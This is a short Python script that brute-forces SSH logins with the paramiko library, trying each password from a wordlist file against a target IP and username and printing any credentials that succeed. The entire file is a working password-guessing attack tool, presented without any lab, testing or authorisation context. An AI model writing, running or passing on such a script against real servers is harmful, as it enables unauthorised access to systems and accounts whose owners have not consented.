import paramiko
import time
import sys
import socket

def ssh_brute_force(target_ip, username, password_file):
    timeout = 200
    
    print(f"[*] Starting SSH brute-force on {target_ip}...")
    print()
    
    try:
        with open (password_file, "r") as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        print(f"[!] File '{password_file}' not found")
        sys.exit (1)
    
    for password in passwords:
        password = password.strip()
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy ())
            ssh.connect(hostname=target_ip,username=username, password=password,timeout=timeout)
            print(f"[+] success!	|	credentials found: \n"
                  f"username: {username} \n"
                  f"password: {password} \n")
            ssh.close()
            return
        except paramiko.AuthenticationException:
            print(f"[-] failed: {password}")
        except (socket.error, paramiko.SSHException) as e:
            print(f"[!] connection error:{str(e)}")
            time.sleep (2)
        finally:
            ssh. close ()
    print("[*] finished. no valid password found.")